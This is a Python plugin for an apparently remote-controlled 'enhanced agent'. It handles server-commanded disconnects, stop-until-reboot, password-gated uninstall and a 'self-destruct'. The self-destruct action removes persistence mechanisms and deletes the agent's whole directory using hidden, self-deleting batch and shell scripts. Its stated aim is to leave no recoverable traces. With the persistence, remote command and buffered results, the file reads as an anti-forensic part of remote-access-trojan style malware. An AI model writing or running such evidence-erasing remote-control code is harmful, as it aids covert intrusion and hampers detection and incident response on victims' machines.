"""
Lifecycle Control Plugin for Enhanced Agent

Provides flexible control over agent lifecycle including temporary disconnect,
stop until reboot, remote uninstall, and self-destruct capabilities.

Requirements: 13.1, 13.2, 13.3, 13.4, 13.5, 13.6, 13.7
"""

import os
import sys
import time
import shutil
import threading
import subprocess
import platform
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
from remote_system.enhanced_agent.plugin_manager import Plugin


@dataclass
class LifecycleResult:
    """
    Result of a lifecycle operation
    
    Attributes:
        success: Whether the operation completed successfully
        action: The action that was performed
        message: Descriptive message about the operation
        scheduled_time: When the action will take effect (for delayed actions)
        error: Error message if operation failed
    """
    success: bool
    action: str
    message: str
    scheduled_time: Optional[float]
    error: Optional[str]


class LifecyclePlugin(Plugin):
    """
    Lifecycle Control Plugin
    
    Provides lifecycle management capabilities:
    - Temporary disconnect with automatic reconnection
    - Stop until reboot
    - Remote uninstall with password validation
    - Self-destruct to delete all files and terminate
    - Result buffering for disconnect/reconnect scenarios
    
    Requirements:
    - 13.1: Temporary disconnect and reconnection after delay
    - 13.2: Terminate until next system reboot
    - 13.3: Remote uninstall with password validation
    - 13.4: Self-destruct to delete all files and terminate
    - 13.5: Resume normal operation and send buffered results on reconnect
    - 13.6: Not restart until system reboots
    - 13.7: Leave no recoverable traces on self-destruct
    """
    
    def __init__(self):
        """Initialize the lifecycle plugin"""
        self.result_buffer = []
        self.disconnect_scheduled = False
        self.uninstall_password = None  # Should be set during agent initialization
    
    def execute(self, args: Dict[str, Any]) -> Any:
        """
        Execute the plugin with the given arguments
        
        Args:
            args: Dictionary containing:
                - action: 'temporary_disconnect', 'stop_until_reboot', 
                         'remote_uninstall', 'self_destruct', 'get_buffered_results'
                - Additional args based on action
                
        Returns:
            Result based on the action
            
        Raises:
            ValueError: If action is invalid or required args are missing
        """
        action = args.get('action')
        
        if action == 'temporary_disconnect':
            return self._temporary_disconnect(args)
        elif action == 'stop_until_reboot':
            return self._stop_until_reboot(args)
        elif action == 'remote_uninstall':
            return self._remote_uninstall(args)
        elif action == 'self_destruct':
            return self._self_destruct(args)
        elif action == 'get_buffered_results':
            return self._get_buffered_results(args)
        elif action == 'buffer_result':
            return self._buffer_result(args)
        else:
            raise ValueError(f"Invalid action: {action}")
    
    def get_name(self) -> str:
        """
        Get the name of the plugin
        
        Returns:
            The plugin name
        """
        return "lifecycle"
    
    def get_required_arguments(self) -> List[str]:
        """
        Get the list of required argument names
        
        Returns:
            List of required argument names
        """
        return ['action']
    
    def set_uninstall_password(self, password: str) -> None:
        """
        Set the password required for remote uninstall
        
        Args:
            password: The password to require for uninstall
        """
        self.uninstall_password = password
    
    def temporary_disconnect(self, delay: int = 60) -> LifecycleResult:
        """
        Temporarily disconnect and reconnect after specified delay
        
        The agent will disconnect from the server and attempt reconnection
        after the specified delay. Buffered results will be sent on reconnect.
        
        Args:
            delay: Delay in seconds before reconnection (default 60)
            
        Returns:
            LifecycleResult with operation status
            
        Requirement 13.1: Agent SHALL disconnect and attempt reconnection 
        after specified delay
        Requirement 13.5: Agent SHALL resume normal operation and send 
        buffered results on reconnect
        """
        try:
            if delay < 0:
                return LifecycleResult(
                    success=False,
                    action='temporary_disconnect',
                    message='',
                    scheduled_time=None,
                    error='Delay must be non-negative'
                )
            
            scheduled_time = time.time() + delay
            self.disconnect_scheduled = True
            
            # Schedule reconnection in a separate thread
            def reconnect_after_delay():
                time.sleep(delay)
                self.disconnect_scheduled = False
                # The agent's reconnection logic will handle the actual reconnection
            
            thread = threading.Thread(target=reconnect_after_delay, daemon=True)
            thread.start()
            
            return LifecycleResult(
                success=True,
                action='temporary_disconnect',
                message=f'Disconnecting for {delay} seconds',
                scheduled_time=scheduled_time,
                error=None
            )
        
        except Exception as e:
            return LifecycleResult(
                success=False,
                action='temporary_disconnect',
                message='',
                scheduled_time=None,
                error=f'Failed to schedule disconnect: {str(e)}'
            )
    
    def stop_until_reboot(self) -> LifecycleResult:
        """
        Stop the agent until the next system reboot
        
        The agent will terminate and will not restart until the system reboots
        or persistence mechanisms trigger on boot.
        
        Returns:
            LifecycleResult with operation status
            
        Requirement 13.2: Agent SHALL terminate until next system reboot
        Requirement 13.6: Agent SHALL not restart until system reboots
        """
        try:
            # Schedule termination in a separate thread to allow response to be sent
            def terminate_agent():
                time.sleep(2)  # Give time for response to be sent
                sys.exit(0)
            
            thread = threading.Thread(target=terminate_agent, daemon=True)
            thread.start()
            
            return LifecycleResult(
                success=True,
                action='stop_until_reboot',
                message='Agent will terminate in 2 seconds',
                scheduled_time=time.time() + 2,
                error=None
            )
        
        except Exception as e:
            return LifecycleResult(
                success=False,
                action='stop_until_reboot',
                message='',
                scheduled_time=None,
                error=f'Failed to stop agent: {str(e)}'
            )
    
    def remote_uninstall(self, password: str) -> LifecycleResult:
        """
        Remove all persistence and delete agent with password validation
        
        Validates the provided password, removes all persistence mechanisms,
        and deletes the agent executable.
        
        Args:
            password: Password for authorization
            
        Returns:
            LifecycleResult with operation status
            
        Requirement 13.3: Agent SHALL remove all persistence and delete itself
        with valid password
        """
        try:
            # Validate password
            if self.uninstall_password is None:
                return LifecycleResult(
                    success=False,
                    action='remote_uninstall',
                    message='',
                    scheduled_time=None,
                    error='Uninstall password not configured'
                )
            
            if password != self.uninstall_password:
                return LifecycleResult(
                    success=False,
                    action='remote_uninstall',
                    message='',
                    scheduled_time=None,
                    error='Invalid password'
                )
            
            # Schedule uninstall in a separate thread
            def perform_uninstall():
                time.sleep(2)  # Give time for response to be sent
                
                # Remove persistence mechanisms
                try:
                    from remote_system.plugins.persistence_plugin import PersistencePlugin
                    persistence = PersistencePlugin()
                    persistence.remove_persistence()
                except Exception:
                    pass  # Continue even if persistence removal fails
                
                # Delete agent executable
                try:
                    agent_path = sys.executable if getattr(sys, 'frozen', False) else __file__
                    
                    # On Windows, use a batch script to delete after exit
                    if platform.system() == 'Windows':
                        batch_script = f'''
@echo off
timeout /t 2 /nobreak > nul
del /f /q "{agent_path}"
del /f /q "%~f0"
'''
                        batch_path = os.path.join(os.environ.get('TEMP', '.'), 'uninstall.bat')
                        with open(batch_path, 'w') as f:
                            f.write(batch_script)
                        
                        subprocess.Popen(batch_path, shell=True, 
                                       creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
                    else:
                        # On Unix, use a shell script
                        shell_script = f'''#!/bin/sh
sleep 2
rm -f "{agent_path}"
rm -f "$0"
'''
                        script_path = '/tmp/uninstall.sh'
                        with open(script_path, 'w') as f:
                            f.write(shell_script)
                        os.chmod(script_path, 0o755)
                        subprocess.Popen(['/bin/sh', script_path])
                
                except Exception:
                    pass  # Continue to exit even if deletion fails
                
                # Terminate
                sys.exit(0)
            
            thread = threading.Thread(target=perform_uninstall, daemon=True)
            thread.start()
            
            return LifecycleResult(
                success=True,
                action='remote_uninstall',
                message='Uninstalling agent in 2 seconds',
                scheduled_time=time.time() + 2,
                error=None
            )
        
        except Exception as e:
            return LifecycleResult(
                success=False,
                action='remote_uninstall',
                message='',
                scheduled_time=None,
                error=f'Failed to uninstall: {str(e)}'
            )
    
    def self_destruct(self) -> LifecycleResult:
        """
        Immediately delete all files and terminate all processes
        
        Performs aggressive cleanup to leave no recoverable traces:
        - Deletes agent executable
        - Deletes all agent-related files
        - Removes persistence mechanisms
        - Terminates all agent processes
        
        Returns:
            LifecycleResult with operation status
            
        Requirement 13.4: Agent SHALL immediately delete all files and terminate
        Requirement 13.7: Agent SHALL leave no recoverable traces
        """
        try:
            # Schedule self-destruct in a separate thread
            def perform_self_destruct():
                time.sleep(1)  # Minimal delay for response to be sent
                
                # Remove persistence mechanisms
                try:
                    from remote_system.plugins.persistence_plugin import PersistencePlugin
                    persistence = PersistencePlugin()
                    persistence.remove_persistence()
                except Exception:
                    pass
                
                # Get paths to delete
                agent_path = sys.executable if getattr(sys, 'frozen', False) else __file__
                agent_dir = os.path.dirname(agent_path)
                
                # Delete agent directory and all contents
                try:
                    if os.path.exists(agent_dir):
                        shutil.rmtree(agent_dir, ignore_errors=True)
                except Exception:
                    pass
                
                # Delete agent executable with platform-specific method
                try:
                    if platform.system() == 'Windows':
                        # Use batch script for self-deletion on Windows
                        batch_script = f'''
@echo off
timeout /t 1 /nobreak > nul
del /f /q /s "{agent_dir}\\*.*"
rmdir /s /q "{agent_dir}"
del /f /q "{agent_path}"
del /f /q "%~f0"
'''
                        batch_path = os.path.join(os.environ.get('TEMP', '.'), 'destruct.bat')
                        with open(batch_path, 'w') as f:
                            f.write(batch_script)
                        
                        subprocess.Popen(batch_path, shell=True,
                                       creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
                    else:
                        # Use shell script for Unix
                        shell_script = f'''#!/bin/sh
sleep 1
rm -rf "{agent_dir}"
rm -f "{agent_path}"
rm -f "$0"
'''
                        script_path = '/tmp/destruct.sh'
                        with open(script_path, 'w') as f:
                            f.write(shell_script)
                        os.chmod(script_path, 0o755)
                        subprocess.Popen(['/bin/sh', script_path])
                
                except Exception:
                    pass
                
                # Terminate immediately
                os._exit(0)
            
            thread = threading.Thread(target=perform_self_destruct, daemon=True)
            thread.start()
            
            return LifecycleResult(
                success=True,
                action='self_destruct',
                message='Self-destruct initiated',
                scheduled_time=time.time() + 1,
                error=None
            )
        
        except Exception as e:
            return LifecycleResult(
                success=False,
                action='self_destruct',
                message='',
                scheduled_time=None,
                error=f'Failed to self-destruct: {str(e)}'
            )
    
    def buffer_result(self, result: Any) -> bool:
        """
        Buffer a result for later delivery
        
        Used during disconnect scenarios to store results that will be
        sent when the agent reconnects.
        
        Args:
            result: The result to buffer
            
        Returns:
            True if buffered successfully
            
        Requirement 13.5: Agent SHALL send buffered results on reconnect
        """
        try:
            self.result_buffer.append({
                'timestamp': time.time(),
                'result': result
            })
            return True
        except Exception:
            return False
    
    def get_buffered_results(self) -> List[Dict[str, Any]]:
        """
        Get all buffered results and clear the buffer
        
        Returns:
            List of buffered results with timestamps
            
        Requirement 13.5: Agent SHALL send buffered results on reconnect
        """
        results = self.result_buffer.copy()
        self.result_buffer.clear()
        return results
    
    def _temporary_disconnect(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle temporary_disconnect action
        
        Args:
            args: Dictionary containing delay
            
        Returns:
            Dictionary representation of LifecycleResult
        """
        delay = args.get('delay', 60)
        
        try:
            delay = int(delay)
        except (TypeError, ValueError):
            delay = 60
        
        result = self.temporary_disconnect(delay)
        
        return {
            'success': result.success,
            'action': result.action,
            'message': result.message,
            'scheduled_time': result.scheduled_time,
            'error': result.error
        }
    
    def _stop_until_reboot(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle stop_until_reboot action
        
        Args:
            args: Dictionary (no additional args needed)
            
        Returns:
            Dictionary representation of LifecycleResult
        """
        result = self.stop_until_reboot()
        
        return {
            'success': result.success,
            'action': result.action,
            'message': result.message,
            'scheduled_time': result.scheduled_time,
            'error': result.error
        }
    
    def _remote_uninstall(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle remote_uninstall action
        
        Args:
            args: Dictionary containing password
            
        Returns:
            Dictionary representation of LifecycleResult
        """
        password = args.get('password', '')
        
        result = self.remote_uninstall(password)
        
        return {
            'success': result.success,
            'action': result.action,
            'message': result.message,
            'scheduled_time': result.scheduled_time,
            'error': result.error
        }
    
    def _self_destruct(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle self_destruct action
        
        Args:
            args: Dictionary (no additional args needed)
            
        Returns:
            Dictionary representation of LifecycleResult
        """
        result = self.self_destruct()
        
        return {
            'success': result.success,
            'action': result.action,
            'message': result.message,
            'scheduled_time': result.scheduled_time,
            'error': result.error
        }
    
    def _get_buffered_results(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle get_buffered_results action
        
        Args:
            args: Dictionary (no additional args needed)
            
        Returns:
            Dictionary with buffered results
        """
        results = self.get_buffered_results()
        
        return {
            'buffered_results': results,
            'count': len(results)
        }
    
    def _buffer_result(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """
        Internal method to handle buffer_result action
        
        Args:
            args: Dictionary containing result to buffer
            
        Returns:
            Dictionary with success status
        """
        result = args.get('result')
        
        if result is None:
            return {
                'success': False,
                'error': 'No result provided to buffer'
            }
        
        success = self.buffer_result(result)
        
        return {
            'success': success,
            'buffer_size': len(self.result_buffer)
        }
